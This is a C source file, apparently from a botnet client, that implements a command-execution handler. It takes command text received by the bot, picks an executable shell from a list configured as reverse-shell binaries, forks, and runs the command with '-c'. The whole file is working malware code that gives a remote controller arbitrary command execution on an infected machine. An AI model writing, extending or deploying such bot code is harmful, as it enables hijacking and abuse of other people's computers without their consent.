#include "bot/client/client.h"
#include "bot/client/commands.h"
#include "bot/config/table.h"
#include "bot/definitions.h"
#include "bot/utils/tokenizer.h"
#include <errno.h>
#include <unistd.h>

void client_cmd_exec(pclient_t client, pbytebuf_t buffer) {
  UNUSED_PARM(client);

  char *cmd_data = (char *) bytebuf_read_bytes(buffer, NULL);
  if (!cmd_data) {
    LOG_ERROR("No command data provided");
    return;
  }

  int found_shell = -1;
  ptokenizer_t binaries = table_retrieve_list(TABLE_REVERSE_SHELL);
  if (!binaries) {
    LOG_ERROR("table_retrieve_list returned NULL");
    return;
  }

  /* find an executable shell */
  for (int i = 0; i < binaries->size; i++) {
    if (binaries->tokens[i] && access(binaries->tokens[i], X_OK) == 0) {
      found_shell = i;
      break;
    }
  }

  if (found_shell == -1) {
    LOG_ERROR("Finding working shell failed");
    tokenizer_free(binaries);
    return;
  }

  pid_t pid = fork();
  if (pid < 0) {
    LOG_ERROR("fork() failed: %s", strerror(errno));
    tokenizer_free(binaries);
    return;
  }

  if (pid > 0) {
    tokenizer_free(binaries);
    return;
  }

  char *argv[] = {
    binaries->tokens[found_shell],
    "-c",
    cmd_data,
    NULL
  };

  execv(argv[0], argv);
  LOG_ERROR("execv(%s) failed: %s", argv[0], strerror(errno));
  tokenizer_free(binaries);
  _exit(127);
}
